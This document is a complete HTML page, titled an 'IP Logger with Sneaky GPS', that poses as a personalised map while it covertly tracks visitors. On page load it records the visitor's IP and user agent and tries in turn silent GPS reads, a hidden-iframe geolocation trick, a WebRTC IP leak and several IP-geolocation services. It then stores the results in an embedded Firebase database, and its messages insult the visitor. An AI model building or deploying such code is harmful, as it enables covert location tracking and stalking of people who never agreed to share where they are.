<!DOCTYPE html>
<html>
<head>
  <title>IP Logger with Sneaky GPS + Fallbacks</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
  <style>
    body { font-family: Arial; text-align: center;}    .fake-map { width: 100%; height: 300px; background: #f0f0f0; border: 1px solid #ccc;}  </style>
</head>
<body>
<h3>Optimizing your experience with location data...</h3>
<div class="fake-map">Loading personalized map...</div>
<script>
  const firebaseConfig = {
    apiKey:"AIzaSyBmeCiF-qqHkaM81Jq-whaxvz4zJ6Ni3R0",
    authDomain:"yachad-32fe3.firebaseapp.com",
    databaseURL:"https://yachad-32fe3-default-rtdb.europe-west1.firebasedatabase.app",
    projectId:"yachad-32fe3",
    storageBucket:"yachad-32fe3.firebasestorage.app",
    messagingSenderId:"720032034735",
    appId:"1:720032034735:web:cabedda1dc842420bbc95a",
    measurementId:"G-YH1NK3RHY3"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  // Fetch visitor IP
  async function getVisitorIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip ||"unknown";} catch {
      return"unknown";}  }

  // Save to Firestore
  function saveToFirestore(lat, lon, ip, source) {
    const ua = navigator.userAgent;
    const time = new Date().toISOString();
    db.collection('ipLogs').add({
      ip: ip,
      userAgent: ua,
      timestamp: time,
      latitude: lat,
      longitude: lon,
      source: source
    }).then(() => {
      document.body.innerHTML =`<p>Your location was logged via <b>${source}</b>. Enjoy!</p>`;
    }).catch(err => {
      document.body.innerHTML =`<p>Error logging your sorry ass:${err}</p>`;
    });}
  // IP-based fallback with more APIs
  function fetchLocation(url, parser) {
    return fetch(url)
      .then(res => res.json())
      .then(parser)
      .catch(() => null);}
  function parseIpApi(data) {
    return { lat: data.lat || null, lon: data.lon || null};}
  function parseIpWhoIs(data) {
    if (data.success === false) return null;
    return { lat: data.latitude || null, lon: data.longitude || null};}
  function parseFreeGeoIp(data) {
    return { lat: data.latitude || null, lon: data.longitude || null};}
  function fallbackToIPLocation(visitorIP) {
    document.body.innerHTML ="<p>GPS failed, scraping your shitty IP location...</p>";
    Promise.all([
      fetchLocation('https://ip-api.com/json/', parseIpApi),
      fetchLocation('https://ipwho.is/', parseIpWhoIs),
      fetchLocation(`https://freegeoip.app/json/${visitorIP}`, parseFreeGeoIp)
    ]).then(results => {
      const validResults = results.filter(r => r!== null);
      if (validResults.length === 0) {
        document.body.innerHTML ="<p>All APIs failed, you slippery bastard.</p>";
        return;}      let latSum = 0, lonSum = 0, count = 0;
      validResults.forEach(r => {
        if (r.lat!== null && r.lon!== null) {
          latSum += r.lat;
          lonSum += r.lon;
          count++;}      });
      const avgLat = count? latSum / count : null;
      const avgLon = count? lonSum / count : null;
      saveToFirestore(avgLat, avgLon, visitorIP,"IP");
    }).catch(err => {
      document.body.innerHTML =`<p>Unexpected error, you lucky prick:${err}</p>`;
    });}
  // Check for pre-granted permissions
  async function probeSilentGeolocation(visitorIP) {
    if ("geolocation" in navigator) {
      try {
        const perm = await navigator.permissions.query({ name:"geolocation" });
        if (perm.state ==="granted") {
          navigator.geolocation.getCurrentPosition(
            pos => {
              saveToFirestore(pos.coords.latitude, pos.coords.longitude, visitorIP,"silentGPS");},            () => tryIframeTrick(visitorIP),
            { timeout: 5000, maximumAge: 0, enableHighAccuracy: true}          );} else {
          tryIframeTrick(visitorIP);}      } catch {
        tryIframeTrick(visitorIP);}    } else {
      fallbackToIPLocation(visitorIP);}  }

  // Enhanced iframe trick with social engineering
  async function tryIframeTrick(visitorIP) {
    return new Promise((resolve) => {
      const iframe = document.createElement("iframe");
      iframe.style.display ="none";
      iframe.src =`data:text/html,<script>
        navigator.geolocation.getCurrentPosition(
          pos => { parent.postMessage({lat: pos.coords.latitude, lon: pos.coords.longitude}, '*');},          () => { parent.postMessage({error: true}, '*');},          { timeout: 5000, enableHighAccuracy: true}        );
      </script>`;
      document.body.appendChild(iframe);

      function onMessage(event) {
        if (event.data.lat && event.data.lon) {
          saveToFirestore(event.data.lat, event.data.lon, visitorIP,"iframeGPS");
          window.removeEventListener("message", onMessage);
          resolve(true);} else {
          window.removeEventListener("message", onMessage);
          resolve(false);}      }
      window.addEventListener("message", onMessage);

      setTimeout(() => {
        window.removeEventListener("message", onMessage);
        resolve(false);}, 7000);
    }).then(success => {
      if (!success) {
        document.body.innerHTML ="<p>Iframe GPS failed, falling back to IP garbage...</p>";
        tryWebRTCLeak(visitorIP);}    });}
  // WebRTC leak for approximate location
  function tryWebRTCLeak(visitorIP) {
    const rtc = new RTCPeerConnection({ iceServers: [{ urls:"stun:stun.l.google.com:19302" }] });
    rtc.createDataChannel("");
    rtc.onicecandidate = e => {
      if (e.candidate) {
        const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
        const ip = ipRegex.exec(e.candidate.candidate);
        if (ip) {
          fetchLocation(`https://ip-api.com/json/${ip[0]}`, parseIpApi).then(data => {
            if (data && data.lat && data.lon) {
              saveToFirestore(data.lat, data.lon, visitorIP,"WebRTC");} else {
              fallbackToIPLocation(visitorIP);}          });} else {
          fallbackToIPLocation(visitorIP);}      }};    rtc.createOffer().then(offer => rtc.setLocalDescription(offer)).catch(() => fallbackToIPLocation(visitorIP));}
  // Main logic
  (async () => {
    const visitorIP = await getVisitorIP();
    document.body.innerHTML ="<p>Fetching your location, you clueless fool...</p>";
    probeSilentGeolocation(visitorIP);
  })();
</script>
</body>
</html>
